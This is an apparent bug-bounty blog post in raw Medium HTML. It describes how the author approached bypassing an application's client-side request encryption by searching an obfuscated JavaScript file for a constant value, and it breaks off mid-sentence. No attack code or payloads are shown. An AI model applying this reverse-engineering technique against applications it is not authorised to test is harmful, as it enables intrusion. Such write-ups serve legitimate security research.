12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav-----------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" href="https://medium.com/search?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmelotover.medium.com%2Fbypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="l"><div class="fu fv fw fx fy l"><div class="ab cb"><div class="ci bh fz ga gb gc"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gi gj gk gl gm"></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><div><h1 id="ca36" class="pw-post-title gs gt gu bf gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu bk" data-testid="storyTitle">Bypassing E2E encryption leads to multiple high vulnerabilities.</h1><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="hv hw hx hy hz ab"><div><div class="ab ia"><div><div class="bm" aria-hidden="false"><a rel="noopener follow" href="/?source=post_page---byline--65b708e5ad84--------------------------------"><div class="l ib ic by id ie"><div class="l fj"><img alt="Asem Eleraky" class="l fd by dd de cx" src="https://miro.medium.com/v2/resize:fill:88:88/1*-oVXJ2PJ5gd_HMA4MY1aPw.jpeg" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="if by l dd de fs n ig ft"></div></div></div></a></div></div></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="ih ab q"><div class="ab q ii"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b ij ik bk"><a class="af ag ah ai aj ak al am an ao ap aq ar il" data-testid="authorName" rel="noopener follow" href="/?source=post_page---byline--65b708e5ad84--------------------------------">Asem Eleraky</a></p></div></div></div><span class="im in" aria-hidden="true"><span class="bf b bg z du">·</span></span><p class="bf b ij ik du"><span><a class="io ip ah ai aj ak al am an ao ap aq ar ex iq ir" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fd906f948337c&amp;operation=register&amp;redirect=https%3A%2F%2Fmelotover.medium.com%2Fbypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84&amp;user=Asem+Eleraky&amp;userId=d906f948337c&amp;source=post_page-d906f948337c--byline--65b708e5ad84---------------------post_header-----------" rel="noopener follow">Follow</a></span></p></div></div></span></div></div><div class="l is"><span class="bf b bg z du"><div class="ab cn it iu iv"><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">9 min read</span><div class="iw ix l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div><span data-testid="storyPublishDate">Jan 20, 2023</span></div></span></div></span></div></div></div><div class="ab cp iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn"><div class="h k w fg fh q"><div class="kd l"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F65b708e5ad84&amp;operation=register&amp;redirect=https%3A%2F%2Fmelotover.medium.com%2Fbypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84&amp;user=Asem+Eleraky&amp;userId=d906f948337c&amp;source=---header_actions--65b708e5ad84---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao kk lc ld ab q fk le lf" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lb"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg><p class="bf b dv z du"><span class="pw-responses-count la lb">10</span></p></button></div></div></div><div class="ab q jo jp jq jr js jt ju jv jw jx jy jz ka kb kc"><div class="lg k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F65b708e5ad84&amp;operation=register&amp;redirect=https%3A%2F%2Fmelotover.medium.com%2Fbypassing-e2e-encryption-leads-to-multiple-high-vulnerabilities-65b708e5ad84&amp;source=---header_actions--65b708e5ad84---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lh" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="fd li cn"><div class="l ae"><div class="ab cb"><div class="lj lk ll lm ln lo ci bh"><div class="ab"><div class="bm bh" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al lp an ao ap ex lq lr lf ls lt lu lv lw s lx ly lz ma mb mc md u me mf mg"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al lp an ao ap ex lq lr lf ls lt lu lv lw s lx ly lz ma mb mc md u me mf mg"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><p id="00aa" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">In today’s blog, I’m going to show you how I was able to bypass the E2E encryption of an application by analyzing an obfuscated javascript file that was imported to that application, and how this helped me to better understand the internals of this application and get to find other multiple high vulnerabilities.</p><h2 id="44c4" class="nf ng gu bf nh ni nj dy nk nl nm ea nn ms no np nq mw nr ns nt na nu nv nw nx bk">Exploration:</h2><p id="afc3" class="pw-post-body-paragraph mh mi gu mj b mk ny mm mn mo nz mq mr ms oa mu mv mw ob my mz na oc nc nd ne gn bk">I started from the login panel, sending requests here and there to explore the application, I found that almost all requests were sent to an API, and their body was formed with some type of encryption as shown below:</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe of"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*PNqboNXbslmCz01sRrgobw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*PNqboNXbslmCz01sRrgobw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*PNqboNXbslmCz01sRrgobw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*PNqboNXbslmCz01sRrgobw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*PNqboNXbslmCz01sRrgobw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*PNqboNXbslmCz01sRrgobw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PNqboNXbslmCz01sRrgobw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*PNqboNXbslmCz01sRrgobw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*PNqboNXbslmCz01sRrgobw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*PNqboNXbslmCz01sRrgobw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*PNqboNXbslmCz01sRrgobw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*PNqboNXbslmCz01sRrgobw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*PNqboNXbslmCz01sRrgobw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*PNqboNXbslmCz01sRrgobw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="599" loading="lazy" role="presentation"/></picture></div></div></figure><p id="86c3" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">As you can see, I can’t find the real body that was sent to the API, can’t find any parameters, all were encrypted!</p><p id="1e8c" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">That is a type of E2E (End-2-End) encryption, where the communication between the client and the server is encrypted, this is an extra security layer to protect against any type of middle attacks.</p><p id="7f09" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">All requests are initiated from our browser, right? so any kind of encryption or encoding that is performed on the request body would be done on the client side, so javascript files will be our target.</p><h2 id="0fda" class="nf ng gu bf nh ni nj dy nk nl nm ea nn ms no np nq mw nr ns nt na nu nv nw nx bk">Javascript Files Analysis— First Round:</h2><p id="6056" class="pw-post-body-paragraph mh mi gu mj b mk ny mm mn mo nz mq mr ms oa mu mv mw ob my mz na oc nc nd ne gn bk">There was only one large js file imported to the whole application, it was obfuscated, minimized, and very messy.</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe or"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*WQ8XNlhBSAWIQkpoRajW2Q.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*WQ8XNlhBSAWIQkpoRajW2Q.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*WQ8XNlhBSAWIQkpoRajW2Q.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*WQ8XNlhBSAWIQkpoRajW2Q.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*WQ8XNlhBSAWIQkpoRajW2Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*WQ8XNlhBSAWIQkpoRajW2Q.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WQ8XNlhBSAWIQkpoRajW2Q.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*WQ8XNlhBSAWIQkpoRajW2Q.png 640w, https://miro.medium.com/v2/resize:fit:720/1*WQ8XNlhBSAWIQkpoRajW2Q.png 720w, https://miro.medium.com/v2/resize:fit:750/1*WQ8XNlhBSAWIQkpoRajW2Q.png 750w, https://miro.medium.com/v2/resize:fit:786/1*WQ8XNlhBSAWIQkpoRajW2Q.png 786w, https://miro.medium.com/v2/resize:fit:828/1*WQ8XNlhBSAWIQkpoRajW2Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*WQ8XNlhBSAWIQkpoRajW2Q.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*WQ8XNlhBSAWIQkpoRajW2Q.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="350" loading="lazy" role="presentation"/></picture></div></div><figcaption class="os ff ot od oe ou ov bf b bg z du">messy javascript file</figcaption></figure><p id="836f" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">To find something here is similar to digging for the needle in the haystack, but let’s give it a try!</p><p id="8d75" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">If we look at what we have, we only have the JSON body that has these key/pairs <code class="cx ow ox oy oz b"><strong class="mj gv">v</strong></code>, <code class="cx ow ox oy oz b"><strong class="mj gv">iv</strong></code>, <code class="cx ow ox oy oz b"><strong class="mj gv">keys</strong></code>, and <code class="cx ow ox oy oz b"><strong class="mj gv">cipher</strong></code>. All these keys are changeable for every request except the <code class="cx ow ox oy oz b"><strong class="mj gv">v</strong></code><strong class="mj gv"> </strong>key, its value is still the same for every request, which is “<strong class="mj gv">pef2</strong>”<strong class="mj gv">.</strong></p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe pa"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*_W95RJqxMI0N_wfMgIdErg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*_W95RJqxMI0N_wfMgIdErg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*_W95RJqxMI0N_wfMgIdErg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*_W95RJqxMI0N_wfMgIdErg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*_W95RJqxMI0N_wfMgIdErg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*_W95RJqxMI0N_wfMgIdErg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_W95RJqxMI0N_wfMgIdErg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*_W95RJqxMI0N_wfMgIdErg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*_W95RJqxMI0N_wfMgIdErg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*_W95RJqxMI0N_wfMgIdErg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*_W95RJqxMI0N_wfMgIdErg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*_W95RJqxMI0N_wfMgIdErg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*_W95RJqxMI0N_wfMgIdErg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*_W95RJqxMI0N_wfMgIdErg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="271" loading="lazy" role="presentation"/></picture></div></div></figure><p id="fb34" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">As this value is fixed (didn’t change in every request), so for sure it would be defined somewhere in the js file, if I found it, maybe it would lead us to the function that performs this encryption.</p><figure class="og oh oi oj ok ol od oe paragraph-image"><div role="button" tabindex="0" class="om on fj oo bh op"><div class="od oe pb"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Mae5sJSQJweuH6VwlxIkJw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Mae5sJSQJweuH6VwlxIkJw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Mae5sJSQJweuH6VwlxIkJw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Mae5sJSQJweuH6VwlxIkJw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Mae5sJSQJweuH6VwlxIkJw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Mae5sJSQJweuH6VwlxIkJw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Mae5sJSQJweuH6VwlxIkJw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*Mae5sJSQJweuH6VwlxIkJw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Mae5sJSQJweuH6VwlxIkJw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Mae5sJSQJweuH6VwlxIkJw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Mae5sJSQJweuH6VwlxIkJw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Mae5sJSQJweuH6VwlxIkJw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Mae5sJSQJweuH6VwlxIkJw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Mae5sJSQJweuH6VwlxIkJw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo oq c" width="700" height="200" loading="lazy" role="presentation"/></picture></div></div><figcaption class="os ff ot od oe ou ov bf b bg z du">searching in javascript to guide us to the function that encrypts the request body</figcaption></figure><p id="3be1" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">As expected, it was mentioned just once, but I spent some time searching and debugging, following the <strong class="mj gv">initiators </strong>(it was more than 55 